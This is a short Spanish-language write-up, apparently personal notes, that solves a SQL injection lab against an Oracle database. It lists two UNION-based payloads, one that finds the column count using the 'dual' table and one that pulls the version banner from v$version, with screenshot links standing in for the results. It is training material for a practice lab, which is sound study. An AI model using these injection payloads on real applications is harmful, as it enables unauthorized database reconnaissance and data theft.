Tenemos el siguiente laboratorio:
![[Pasted image 20240511230435.png]]
Vamos a determinar el número columnas de la tabla y las columnas que tienen información:
```bash
'+UNION+SELECT+'abc','def'+FROM+dual--
```
![[Pasted image 20240511230545.png]]
Y vemos lo siguiente:
![[Pasted image 20240511230602.png]]
Y ahora usamos el siguiente payload:
```bash
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
![[Pasted image 20240511230632.png]]
Lo ejecutamos y ya tenemos el laboratorio resuelto:
![[Pasted image 20240511230654.png]]
